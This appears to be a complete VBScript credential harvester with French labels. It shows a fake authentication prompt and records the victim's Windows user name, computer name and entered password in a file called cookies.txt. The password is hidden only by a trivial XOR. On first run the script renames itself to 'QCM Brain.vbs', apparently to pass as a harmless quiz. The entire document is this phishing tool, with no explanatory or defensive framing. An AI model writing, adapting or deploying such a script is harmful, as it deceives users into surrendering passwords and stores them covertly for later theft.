Set objNetwork = CreateObject("WScript.Network")
sessionName = objNetwork.UserName
computerName = objNetwork.ComputerName

password = InputBox("Veuillez entrer le mot de passe:", "Authentification")

If password <> "" Then
    cheminFichier = "C:\Users\faniz\Downloads\yo\VARTXT\cookies.txt"
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    If objFSO.FileExists(cheminFichier) Then
        Set objFile = objFSO.OpenTextFile(cheminFichier, 1)
        strContenu = objFile.ReadAll
        objFile.Close
        debutSession = InStr(strContenu, "Nom de la session: " & sessionName)
        If debutSession > 0 Then
            debutMotDePasse = InStr(debutSession, strContenu, "Mot de passe enregistré:")
            finMotDePasse = InStr(debutMotDePasse, strContenu, vbCrLf)
            motDePasseChiffre = ChiffrerMotDePasse(password)
            strContenu = Left(strContenu, debutMotDePasse) & "Mot de passe enregistré: " & motDePasseChiffre & Mid(strContenu, finMotDePasse)
            Set objFile = objFSO.OpenTextFile(cheminFichier, 2)
            objFile.Write strContenu
            objFile.Close
        Else
            Set objFile = objFSO.OpenTextFile(cheminFichier, 8, True)
            objFile.WriteLine "Nom de la session: " & sessionName
            objFile.WriteLine "Nom du PC: " & computerName 
            motDePasseChiffre = ChiffrerMotDePasse(password)
            objFile.WriteLine "Mot de passe enregistré: " & motDePasseChiffre & vbCrLf
            objFile.Close
        End If
    Else
        Set objFile = objFSO.CreateTextFile(cheminFichier, True)
        objFile.WriteLine "Nom de la session: " & sessionName
        objFile.WriteLine "Nom du PC: " & computerName
        motDePasseChiffre = ChiffrerMotDePasse(password)
        objFile.WriteLine "Mot de passe enregistré: " & motDePasseChiffre & vbCrLf
        objFile.Close
        nouveauNom = "QCM Brain.vbs"
        objFSO.MoveFile WScript.ScriptFullName, objFSO.GetFile(WScript.ScriptFullName).ParentFolder & "\" & nouveauNom
    End If
End If

Function ChiffrerMotDePasse(motDePasse)
    cleChiffrement = 42
    motDePasseChiffre = ""
    For i = 1 To Len(motDePasse)
        caractere = Mid(motDePasse, i, 1)
        caractereChiffre = Chr(Asc(caractere) Xor cleChiffrement)
        motDePasseChiffre = motDePasseChiffre & caractereChiffre
    Next
    ChiffrerMotDePasse = motDePasseChiffre
End Function
